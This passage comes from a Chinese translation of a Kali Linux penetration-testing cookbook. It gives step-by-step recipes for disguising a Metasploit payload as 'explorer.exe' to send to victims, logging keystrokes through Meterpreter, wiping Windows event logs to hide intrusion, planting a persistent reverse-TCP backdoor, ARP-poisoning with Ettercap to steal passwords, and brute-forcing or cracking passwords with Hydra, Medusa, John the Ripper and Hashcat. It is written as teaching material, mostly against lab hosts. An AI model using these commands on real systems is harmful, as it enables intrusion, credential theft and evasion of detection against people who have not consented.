    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-6.jpg)
    
### 工作原理

这个秘籍中，我们探索了 SET 的用法。SET 拥有菜单风格的接口，使它易于生成用于欺骗受害者的工具。我们以初始化 SET 开始，之后，SET 为我们提供了几种攻击方式。一旦我们选择了它，SET 会跟 Metasploit 交互，同时询问用户一系列问题。在这个秘籍的最后，我们创建了可执行文件，它会提供给我们目标主机的 Meterpreter  活动会话。

### 更多

作为替代，你可以从桌面上启动 SET，访问`Applications | Kali Linux | Exploitation Tools | Social Engineering Tools | Social Engineering Toolkit | Set`。

**将你的载荷传给受害者**

下面的步骤会将你的载荷传给受害者。

1.  在 SET 目录下，你胡注意到有个 EXE 文件叫做`msf.exe`。推荐你将文件名称修改为不会引起怀疑的名称。这里，我们将它改为`explorer.exe`。最开始，我们打开终端窗口并访问 SET 所在的目录。

    ```
    cd /usr/share/set 
    ```
    
2.  之后我们获得目录中所有项目的列表。

    ```
    ls
    ```
    
3.  之后我们将这个文件重命名为`explorer.exe`：

    ```
    mv msf.exe explorer.exe
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-3-7.jpg)

4.  现在我们压缩` explorer.exe`载荷。这里，ZIP 归档叫做`healthyfiles`。

    ```
    zip healthyfiles explorer.exe 
    ```
    
5.  既然你已经拥有了 ZIP 归档，你可以把文件以多种方式分发给受害者。你可以通过电子邮件来传递，也可以放进 U 盘并手动在受害者机器中打开，以及其它。探索这些机制会给你想要的结果来达成你的目标。

## 7.4 收集受害者数据

这个秘籍中，我们会探索如何使用 Metasploit 来收集受害者的数据。有几种方式来完成这个任务，但是我们会探索在目标机器上记录用户击键顺序的方式。收集受害者数据可以让我们获得潜在的额外信息，我们可以将其用于进一步的攻击中。对于我们的例子，我们会收集目标主机上用户输入的击键顺序。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 使用 Metasploit 框架的具有漏洞的主机。

### 操作步骤

让我们开始通过 Meterpreter  shell 来收集受害者数据。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。

1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-4-1.jpg)
    
2.  下面，我们执行下面的命令来开启键盘记录器：

    ```
    keyscan_start
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-4-2.jpg)
    
3.  最后，我们输入` keyscan_dump`命令，将用户的击键顺序输出到屏幕上。

    ```
    keyscan_dump
    ```
    
### 工作原理

这个秘籍中，我们使用 Meterpreter 收集了受害者的数据。

### 更多

有一种不同的方式，你可以使用它们来收集受害者机器上的数据。这个秘籍中，我们使用了 Metasploit 和 Metasploit keyscan 来记录击键顺序，但是我们也可以使用 Wireshark 或 airodump-ng 来更简单地收集数据。

这里的关键是探索其它工具，便于你找到最喜欢的工具来完成你的目标。

## 7.5 清理踪迹

这个秘籍中，我们会使用 Metasploit 来清除我们的踪迹。在黑进主机之后执行清理是个非常重要的步骤，因为你不想在经历所有麻烦来获得访问权限之后还被人查水表。幸运的是，Metasploit 拥有一种方式来非常简单地清除我们的踪迹。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 使用 Metasploit 框架的具有漏洞的主机。

### 操作步骤

需要执行步骤如下所示：

1.  让我们开始使用  Meterpreter shell 来清理我们的踪迹。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-5-1.jpg)
    
2.  下面，我们需要运行 IRB，以便进行日志移除操作。我们打开帮助文件：

    ```
    irb
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-5-2.jpg)
    
3.  下面，我们告诉 IRB 要移除哪个文件。下面是一个可用的选择：

    ```
    log = client.sys.eventlog.open('system') 
    log = client.sys.eventlog.open('security') 
    log = client.sys.eventlog.open('application') 
    log = client.sys.eventlog.open('directory service') 
    log = client.sys.eventlog.open('dns server') 
    log = client.sys.eventlog.open('file replication service')
    ```
    
4.  出于我们的目的，我们把它们都清理掉。你需要将这些一次键入：

    ```
    log = client.sys.eventlog.open('system') 
    log = client.sys.eventlog.open('security') 
    log = client.sys.eventlog.open('application') 
    log = client.sys.eventlog.open('directory service') 
    log = client.sys.eventlog.open('dns server') 
    log = client.sys.eventlog.open('file replication service')
    ```
    
5.  现在我们执行命令来清理日志文件：

    ```
    Log.clear 
    ```
    
6.  这就结束了。我们只用了这么少的命令就能清理我们的踪迹。

### 工作原理

这个秘籍中，我们使用 Meterpreter  来清理我们在目标主机上的踪迹。我们从 Meterpreter 中开始这个秘籍，并启动了 IRB（一个 Ruby 解释器 shell）。下面，我们指定了想要清理的文件，并且最后键入了`Log.clear `命令来清理日志。要记住，一旦我们黑进了某个主机，你需要在最后执行这一步。你不能在清理踪迹之后再执行更多的操作，这样只会更加更多的日志条目。

## 7.6 创建永久后门

这个秘籍中，我们会使用 Metasploit persistence 来创建永久后门。一旦你成功获得了目标机器的访问权限，你需要探索重新获得机器访问权的方式，而不需要再次黑进它。如果目标机器的用户做了一些事情来终端连接，比如重启机器，后门的作用就是允许重新建立到你机器的连接。这就是创建后门非常方便的原因，它可以让你控制目标机器的访问。

### 准备

为了执行这个秘籍，我们需要：

+ 内部网络或互联网的连接。

+ 使用 Metasploit 框架的具有漏洞的主机。

### 操作步骤

让我们开始植入我们的永久后门。你需要使用 Metasploit  攻击某个主机来获得  Meterpreter shell。你可以使用第六章的秘籍之一，来通过 Metasploit 获得目标主机的访问。

1.  一旦你通过 Metasploit 和 Meterpreter shell 获得了受害者的访问权限，等待你的 Meterpreter 显示提示符。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-6-1.jpg)

2.  下面，我们需要运行 persistence，以便创建我们的后门。我们打开帮助文件：

    ```
    run persistence –h 
    ```
    
3.  永久后门有几个选项，包括：

    +   `-A`：这个选项会自动启动一个匹配的多重处理器来链接到代理端。
    
    +   `-S`：这个选项让后门自动化启动为系统服务。
    
    +   `-U`：这个选项让后门在用户启动系统时自动启动。
    
    +   `-i`：这个选项设置两次尝试回复攻击者机器之间的秒数。
    
    +   `-p`：这个选项设置攻击者机器上 Metasploit 的监听端口。
    
    +   `-P`：这个选项设置所用的载荷。默认使用` Reverse_tcp `，并且它通常是你想使用的东西。
    
    +   `-r`：这个选项设置攻击者机器的 IP 地址。
    
4.  现在，我们执行命令来建立后门：

    ```
    run persistence –U –A –i 10 – 8090 –r 192.168.10.109
    ```
    
5.  后门现在已经建立了。如果成功的话，你会注意到你有了第二个 Meterpreter  会话。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-6-2.jpg)
    
### 工作原理

这个秘籍中，我们使用 Meterpreter  来建立永久后门。我们在黑进目标主机并获得  Meterpreter shell 之后开始了这个秘籍。之后我们通过浏览帮助文档那个，探索了一些可用的永久化方式。最后，我们通过运行安装命令并设置它的选项来完成后门的安装。

## 7.7 中间人（MITM）攻击

这个秘籍中，我们会对目标进行中间人（MITM）攻击。MITM 攻击允许我们窃听目标和别人的通信。在我们的例子中，当某个 Windows 主机在<http://www.yahoo.com>收发邮件时，我们使用 Ettercap 来窃听它的通信。

### 准备

为了执行这个秘籍，我们需要：

+ 无线网络连接

+ 连接到无线网络的机器

### 操作步骤

让我们启动 Ettercap 来开始中间人攻击。

1.  打开终端窗口并启动 Ettercap。使用`-G`选项加载 GUI：

    ```
    ettercap –G
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-1.jpg)
    
2.  我们以打开` Unified sniffing`（统一嗅探）开始。你可以按下`Shift + U`或者访问菜单中的` Sniff | Unified sniffing`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-2.jpg)

3.  选择网络接口。在发起 MITM 攻击的情况中，我们应该选项我们的无线接口。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-3.jpg)
    
4.  下面，我们打开`Scan for hosts`（扫描主机）。可以通过按下`Ctrl + S`或访问菜单栏的` Hosts | Scan for hosts`来完成。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-4.jpg)

5.  下面，我们得到了`Host List`（主机列表）。你可以按下`H`或者访问菜单栏的`Hosts | Host List`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-5.jpg)
    
6.  我们下面需要选择或设置我们的目标。在我们的例子中，我们选择`192.168.10.111`作为我们的`Target 1`，通过选中它的 IP 地址并按下` Add To Target 1 `（添加到目标 1）按钮。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-6.jpg)
    
7.  现在我们能够让 Ettercap 开始嗅探了。你可以按下`Ctrl + W`或访问菜单栏的` Start | Start sniffing`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-7.jpg)

8.  最后，我们开始进行 ARP 毒化。访问菜单栏的`Mitm | Arp poisoning`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-8.jpg)

9.  在出现的窗口中，选中` Sniff  remote connections`（嗅探远程连接）的选项。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-9.jpg)

0.  取决于网络环境，我们会看到信息。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-10.jpg)

1.  一旦我们找到了想要找的信息（用户名和密码）。我们可以关闭 Ettercap。你可以按下`Ctrl + E`或访问菜单栏的`Start | Stop sniffing`来完成它。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-11.jpg)

2.  现在我们关闭 ARP 毒化，使网络恢复正常。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/7-7-12.jpg)

### 工作原理

这个秘籍包括 MITM 攻击，它通过 ARP 包毒化来窃听由用户传输的无线通信。

> 你可以通过浏览<http://en.wikipedia.org/wiki/Man-in-the-middle_attack#Example_of_an_attack>来了解更多关于 MITM 的信息。


# 第八章：密码攻击

> 作者：Willie L. Pritchett, David De Smet

> 译者：[飞龙](https://github.com/)

> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

这一章中，我们要探索一些攻击密码来获得用户账户的方式。密码破解是所有渗透测试者都需要执行的任务。本质上，任何系统的最不安全的部分就是由用户提交的密码。无论密码策略如何，人们必然讨厌输入强密码，或者时常更新它们。这会使它们易于成为黑客的目标。

## 8.1 在线密码攻击

这个秘籍中我们会使用 Hydra 密码破解器。有时候我们有机会来物理攻击基于 Windows 的计算机，直接获取安全账户管理器（SAM）。但是，我们也有时不能这样做，所以这是在线密码攻击具有优势的情况。

Hydra 支持许多协议，包括（但不仅限于）FTP、HTTP、HTTPS、MySQL、MSSQL、Oracle、Cisco、IMAP、VNC 和更多的协议。需要注意的是，由于这种攻击可能会产生噪声，这会增加你被侦测到的可能。

### 准备

需要内部网络或互联网的链接，也需要一台用作受害者的计算机。

### 操作步骤

让我们开始破解在线密码。

1.  在开始菜单中，选择` Applications | Kali Linux | Password Attacks | Online Attacks | hydra-gtk`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-1-1.jpg)
    
2.  既然我们已经把 Hydra 打开了，我们需要设置我们的单词列表。点击`Passwords`（密码）标签页。我们需要使用用户名列表和密码列表。输入你的用户名和密码列表的位置。同时选择` Loop around users `（循环使用用户名）和` Try  empty password`（尝试空密码）。

    +   用户名列表：`/usr/share/wfuzz/wordlist/fuzzdb/wordlistsuser-passwd/names/nameslist.txt`
    +   密码列表：`/usr/share/wfuzz/wordlist/fuzzdb/wordlistsuser-passwd/passwds/john.txt`
    
    > 你可以使用的快捷方式是，点击单词列表框来打开文件系统窗口。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-1-2.jpg)
    
3.  下面，我们要做一些调整。在`Performance Options`（执行选项）下面，我们将任务数量从 16 设置为 2。原因是我们不打算让这么多进程运行，这样会使服务器崩溃。虽然它是可选的，我们也希望选择`Exit after first found pair `（在首次发现匹配之后退出）选项。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-1-3.jpg)
    
4.  最后，我们要设置我们的目标。点击`Target`（目标）标签页并设置我们的目标和协议。这里，我们使用 Metasploitable 主机（`192.168.10.111`）的 MySQL 端口。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-1-4.jpg)

5.  最后我们点击`Start`（开始）标签页的`Start`按钮来启动攻击。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-1-5.jpg)
    
### 工作原理

这个秘籍中，我们使用 Hydra 来对目标执行字典攻击。Hydra 允许我们指定目标，并且使用用户名和密码列表。它会通过使用来自两个列表的不同用户名和密码组合来爆破密码。

## 8.2 破解 HTTP 密码

这个秘籍中，我们将要使用 Hydra 密码破解器来破解 HTTP 密码。网站和 Web 应用的访问通常由用户名和密码组合来控制。就像任何密码类型那样，用户通常会输入弱密码。

### 准备

需要内部网络或互联网的链接，也需要一台用作受害者的计算机。

### 操作步骤

让我们开始破解 HTTP 密码。

1.  在开始菜单中，选择` Applications | Kali Linux | Password Attacks | Online Attacks | hydra-gtk`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-2-1.jpg)
    
2.  既然我们已经把 Hydra 打开了，我们需要设置我们的单词列表。点击`Passwords`（密码）标签页。我们需要使用用户名列表和密码列表。输入你的用户名和密码列表的位置。同时选择` Loop around users `（循环使用用户名）和` Try  empty password`（尝试空密码）。

    +   用户名列表：`/usr/share/wfuzz/wordlist/fuzzdb/wordlistsuser-passwd/names/nameslist.txt`
    +   密码列表：`/usr/share/wfuzz/wordlist/fuzzdb/wordlistsuser-passwd/passwds/john.txt`
    
    > 你可以使用的快捷方式是，点击单词列表框来打开文件系统窗口。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-2-2.jpg)
    
3.  下面，我们要做一些调整。在`Performance Options`（执行选项）下面，我们将任务数量从 16 设置为 2。原因是我们不打算让这么多进程运行，这样会使服务器崩溃。虽然它是可选的，我们也希望选择`Exit after first found pair `（在首次发现匹配之后退出）选项。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-2-3.jpg)
    
4.  最后，我们要设置我们的目标。点击`Target`（目标）标签页并设置我们的目标和协议。这里，我们使用 Metasploitable 主机（`192.168.10.111`）的 HTTP 端口。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-2-4.jpg)

5.  最后我们点击`Start`（开始）标签页的`Start`按钮来启动攻击。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-2-5.jpg)

## 8.3 获得路由访问

这个秘籍中，我们会使用 Medusa 来进行爆破攻击。

当今，我们处于网络社会之中。随着联网视频游戏系统的诞生，多数家庭拥有数台计算机，并且小型业务以创纪录的趋势增长。路由器也成为了网络连接的基石。然而，富有经验的网络管理员的数量并没有增长，以保护这些路由器，使得许多这种路由器易于被攻击。

### 准备

需要连接到互联网或内部网络的计算机。也需要可用的路由器。

### 操作步骤

1.  在开始菜单中，访问` Applications | Kali Linux | Password Attacks | Online Attacks | medusa`。当 Medusa 启动后，它会加载`help`（帮助）文件。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-3-1.jpg)

2.  我们现在已选定的选项来云顶 Medusa。

    ```
    medusa –M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/ wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F
    ```
    
    +   `-M http`允许我们指定模块。这里，我们选择了 HTTP 模块。
    
    +   `-h 192.168.10.1`允许我们指定主机。这里，我们选择了`192.168.10.1`（路由的 IP 地址）。
    
    +   `-u admin`允许我们指定用户。这里我们选择了`admin`。
    
    +   `-P [location of password list]`允许我们指定密码列表的位置。
    
    +   `-e ns`允许我们指定额外的密码检查。`ns`变量允许我们使用用户名作为密码，并且使用空密码。
    
    +   `-n 80`允许我们指定端口号码。这里我们选择了`80`。
    
    +   `-F`允许我们在成功找到用户名密码组合之后停止爆破。
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-3-2.jpg)
    
3.  Medusa 会运行，并尝试所有用户名和密码组合，直到某次成功。

### 工作原理

这个秘籍中，我们使用 Medusa 来爆破目标路由器的密码。能够这样做的好处就是，一旦你能够访问路由器，你就可以更新它的设置，便于你以后再访问它，或者甚至是重定向发送给它的流量来改变你选择的位置。

### 更多

你也可以直接从命令行运行 Medusa，通过键入`medusa`命令。

你也可以传入其它选项给 Medusa，取决于你的情况。细节请参见帮助文档，通过在终端窗口仅仅键入`medusa`来显示。

**模块类型**

下面是我们可以用于 Medusa 的模块列表：

+ AFP
+ CVS
+ FTP
+ HTTP
+ IMAP
+ MS-SQL
+ MySQL
+ NetWare
+ NNTP
+ PCAnywhere
+ Pop3
+ PostgreSQL
+ REXEC
+ RLOGIN
+ RSH
+ SMBNT
+ SMTP-AUTH
+ SMTp-VRFY
+ SNMP
+ SSHv2
+ Subversion
+ Telnet
+ VMware Authentication
+ VNC
+ Generic Wrapper
+ Web form

## 8.4 密码分析

这个秘籍中，我们会学到如何在密码攻击之前分析密码。密码分析的目的是允许我们通过收集目标机器、业务以及其它的信息来得到更小的单词列表。在我们的教程中，我们会使用 Ettercap 和 它的 ARP 毒化功能来嗅探流量。

### 准备

这个秘籍需要局域网的连接。

### 操作步骤

让我们启动 Ettercap 来进行密码分析。

1.  我们以配置 Ettercap 来开始这个秘籍。首先，我们找到它的配置文件并用 VIM 编辑它。

    ```
    locate etter.conf 
    vi /etc/etterconf
    ```
    
    要注意，你的位置可能不同。

2.  将`ec_uid`和`ec_gid`改为`0`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-1.jpg)

3.  下面我们需要取消下面的 IPTABLES 行的注释。它在靠近文件末尾的` LINUX `一节。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-2.jpg)
    
4.  现在，我们将要启动 Ettercap。使用`-G`选项，加载图形化界面（GUI）。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-3.jpg)

5.  我们开启统一嗅探。你可以按下`Shift + U`或者访问菜单栏中的`Sniff | Unified sniffing...`。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-4.jpg)

6.  选择网络接口。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-5.jpg)

7.  下面，我们开始`Scan for hosts`（扫描主机），这可以通过按下`Ctrl + S`或访问菜单栏的`Hosts | Scan for hosts`来完成。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-6.jpg)

8.  现在我们能够让 Ettercap 开始嗅探了。你可以按下`Ctrl + W`或访问菜单栏的`Start | Start Sniffing`（开始嗅探）。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-7.jpg)

9.  最后，我们开始进行 ARP 毒化。访问菜单栏的`Mitm | Arp poisoning`（ARP 毒化）。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-8.jpg)

0.  在出现的窗口中，选中`Sniff  remote connections`（嗅探远程连接）的选项。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-9.jpg)

1.  取决于网络情况，我们会看到信息。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-10.jpg)

2.  一旦我们找到了我们想找的信息（用户名和密码）。我们会关闭 Ettercap。你可以按下`Ctrl + E`或者访问菜单栏的` Start | Stop sniffing`（停止嗅探）来完成。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-11.jpg)
    
3.  现在我们需要关闭 ARP 毒化来使网络恢复正常。

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-12.jpg)

### 工作原理

这个秘籍中，我们使用 Ettercap 来毒化网络并偷取网络上的用户名和密码。我们以寻找和修改 Ettercap 的配置文件来开始。之后我们启动了 Ettercap 并使用 ARP 毒化执行中间人（MITM）攻击。由于流量被重定向到我们的主机，当用户名和密码在网络上传播时，我们就能够看到它们。

### 更多

我们也可以使用  Metasploit 来分析用户名和面。我们会通过使用搜索邮件收集器模块来执行它。

1.  打开终端窗口并启动  MSFCONSOLE：

    ```
    msfconsole
    ```
    
2.  搜索邮件收集器；

    ```
    search email collector
    ```

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-13.jpg)

3.  键入下列命令来使用搜索邮件收集器模块：

    ```
    use auxiliary/gather/search_email_collector 
    ```
    
4.  展示该模块可用的选项：

    ```
    show options
    ```

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-14.jpg)
    
5.  下面我们设置域名。如果不想被有关部门查水表的话，请小心选择域名。

6.  将域名设为你希望的域名：

    ```
    set domain  gmail.com
    ```
    
7.  设置输入文件。这并不是必需的。如果你打算运行多个攻击，或打算稍后也能运行某个攻击，推荐设置它。

    ```
    set outfile /root/Desktop/fromwillie.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-15.jpg)
    
8.  最后，我们开始攻击。

    ```
    run
    ```

    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-4-16.jpg)

## 8.5 使用 John the Ripper 破解 Windows 密码

这个秘籍中，我们会使用 John the Ripper 来破解 Windows 安全访问管理器（SAM）文件。SAM 文件储存了目标系统用户的用户名和密码的哈希。出于安全因素，SAM 文件使用授权来保护，并且不能在 Windows 系统运行中直接手动打开或复制。

### 准备

你将会需要访问 SAM 文件。

这个秘籍中，我们假设你能够访问某台 Windows 主机。

### 操作步骤

让我们开始使用 John the Ripper 破解 Windows SAM 文件。我们假设你能够访问某台 Windows 主机，通过远程入侵，或者物理接触，并且能够通过 USB 或 DVD 驱动器启动 Kali Linux。

1.  看看你想挂载哪个硬盘：

    ```
    Fdisk -l
    ```
    
2.  挂载该硬盘，并将`target`设为它的挂载点。

    ```
    mount /dev/sda1 /target/ 
    ```
    
3.  将目录改为 Windows SAM 文件的位置：

    ```
    cd /target/windows/system32/config 
    ```
    
4.  列出目录中所有内容。

    ```
    ls –al
    ```
    
5.  使用 SamDump2 来提取哈希，并将文件放到你的 root 用户目录中的一个叫做`hashes`的文件夹中。

    ```
    samdump2 system SAM > /root/hashes/hash.txt
    ```
    
6.  将目录改为 John the Ripper 所在目录。

7.  运行 John the Ripper：

    ```
    ./john /root/hashes/hash.txt 
    ./john /root/hashes/hash.txt–f:nt  (If attacking a file on a NTFS System) 
    ```
    
## 8.6 字典攻击

这个秘籍中，我们会进行字典或单词列表的攻击。字典攻击使用事先准备的密码集合，并尝试使用单词列表爆破与指定用户匹配的密码。所生成的字典通常由三种类型：

    +   只有用户名：列表只含有用户名。
    +   只有密码：列表只含有密码。
    +   用户名和密码：列表含有生成的用户名和密码。
    
出于演示目的，我们使用 Crucnch 来生成我们自己的密码字典。

### 准备

需要在 Kali 上安装 Crunch。

### 操作步骤

Kali 的好处是已经安装了 Crunch，不像 BackTrack。

1.  打开终端窗口，并输入`crunch`命令来查看 Crunch 的帮助文件。

    ```
    crunch
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-6-1.jpg)
    
2.  使用 Crunch 生成密码的基本语法是，`[minimum length] [maximum length] [character set] [options] `。

3.  Crunch 拥有几种备选选项。一些常用的如下：

    +   `-o`：这个选项允许你指定输出列表的文件名称和位置、
    
    +   `-b`：这个选项允许你指定每个文件的最大字节数。大小可以以 KB/MB/GB 来指定，并且必须和`-o START`触发器一起使用。
    
    +   `-t`：这个选项允许你指定所使用的模式。
    
    +   `-l`：在使用`-t`选项时，这个选项允许你将一些字符标识为占位符（`@`，`%`，`^`）。
    
4.  下面我们执行命令来在桌面上创建密码列表，它最少 8 个字母，最大 10 个字符，并且使用字符集`ABCDEFGabcdefg0123456789`。

    ```
    crunch 8 10 ABCDEFGabcdefg0123456789 –o /root/Desktop/ generatedCrunch.txt
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-6-2.jpg)
    
5.  一旦生成了文件，我们使用 Nano 来打开文件：

    ```
    nano /root/Desktop/generatedCrunch.txt
    ```
    
### 工作原理

这个秘籍中我们使用了 Crunch 来生成密码字典列表。

## 8.7 使用彩虹表

这个秘籍中我们会学到如何在 Kali 中使用彩虹表。彩虹表是特殊字典表，它使用哈希值代替了标准的字典密码来完成攻击。出于演示目的，我们使用 RainbowCrack 来生成彩虹表。

### 操作步骤

1.  打开终端窗口并将目录改为`rtgen`的目录：

    ```
    cd /usr/share/rainbowcrack/
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-7-1.jpg)
    
2.  下面我们要启动`rtgen`来生成基于 MD5 的彩虹表。

    ```
    ./rtgen md5 loweralpha-numeric 1 5 0 3800 33554432 0
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-7-2.jpg)
    
3.  一旦彩虹表生成完毕，你的目录会包含`.rt`文件。这取决于用于生成哈希的处理器数量，大约需要 2~7 个小时。

4.  为了开始破解密码，我们使用`rtsort`程序对彩虹表排序，使其更加易于使用。

### 工作原理

这个秘籍中，我们使用了 RainbowCrack  攻击来生成、排序和破解 MD5 密码。RainbowCrack 能够使用彩虹表破解哈希，基于一些预先准备的哈希值。我们以使用小写字母值生成 MD5 彩虹表来开始。在秘籍的末尾，我们成功创建了彩虹表，并使用它来破解哈希文件。

## 8.8 使用英伟达统一计算设备架构（CUDA）

这个秘籍中，我们会使用英伟达统一计算设备架构（CUDA）来破解密码哈希。CUDA 是一个并行计算平台，它通过利用 GPU 的能力来提升计算性能。随着时间的流逝，GPU 的处理能力有了戏剧性的提升，这让我们能够将它用于计算目的。出于演示目的，我们使用  CudaHashcat-plus 来破解密码。

### 准备

需要 CUDA 所支持的显卡来完成这个秘籍。

### 操作步骤

1.  打开终端窗口并将目录改为  OclHashcat-plus 所在目录。

    ```
    cd /usr/share/oclhashcat-plus
    ```
    
    ![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali-cb/img/8-8-1.jpg)
    
2.  执行下列命令来启动  CudaHashcat-plus 的帮助文件：

    ```
    ./cudaHashcat-plus.bin –help 
    ```
    
3.  运行 CudaHashcat 的语法是`cudaHashcat-plus.bin [options] hash [mask]`。

    > 使用  OclHashcat 的重点之一是理解它的字符集结构。
    
4.  在我们开始攻击之前，让我们先看看一些可用的攻击向量。CudaHashcat 在攻击中使用左右掩码。密码的字符按照掩码划分，并且被均分为左和右掩码。对于每个掩码，你可以为其指定字典或字符集。出于我们的目的，我们会使用定制的字符集。

5.  为了指定自定义字符集，我们使用`–1`选项。我们可以设置任意多的自定义字符集，只要为它们指定一个数值（`1-n`）。每个自定义字符都由问号（`?`）来表示，并且随后是字符类型。可用的选择是：

    +   `d`指定数字（0~9）
    +   `l`指定小写字母
    +   `u`指定大写字母
    +   `s`指定特殊字符
    +   `1-n`指定用做占位符的自定义字符集。
    
6.  这样将它们组合起来，我们就指定了一个自定义字符集，它包括特殊字符（`s`），大写字母（`u`），小写字母（`l`）和数字（`d`），生成长度为 8 的密码。我们打算指定叫做`attackfile`的哈希表。

    ```
    ./cudaHashcat-plus.bin attackfile -1 ?l?u?d?s ?1?1?1?1 ?1?1?1?1
    ```
    
7.  我们可以将这个命令这样拆分：

    +   ` ./cudaHashcat-plus.bin `调用了 CudaHashcat 。
    
    +   `attackfile`是我们的攻击文件。
    
    +   `-1 ?l?u?d?`指定了自定义字符集`1`，它包含小写字母、大写字母、数字和特殊字符。
    
    +   `?1?1?1?1`是使用字符集`1`的左掩码。
    
    +   `?1?1?1?1`是使用字符集`1`的右掩码。
    
    这就结束了。

## 8.9 使用 ATI Stream

这个秘籍中，我们会使用 ATI Stream 来破解密码哈希。ATI Stream 类似于 CUDA，因为它是一个并行计算平台，它可以通过利用 GPU 的能力来提升计算性能。随着时间的流逝，GPU 的处理能力有了戏剧性的提升，这让我们能够将它用于计算目的。出于演示目的，我们使用  OclHashcat-plus 来破解密码。OclHashcat 有两种版本：plus 和 lite。两个都包含在 Kali 中。

### 准备

需要支持 ATI Stream 的显卡来完成这个秘籍。

### 操作步骤

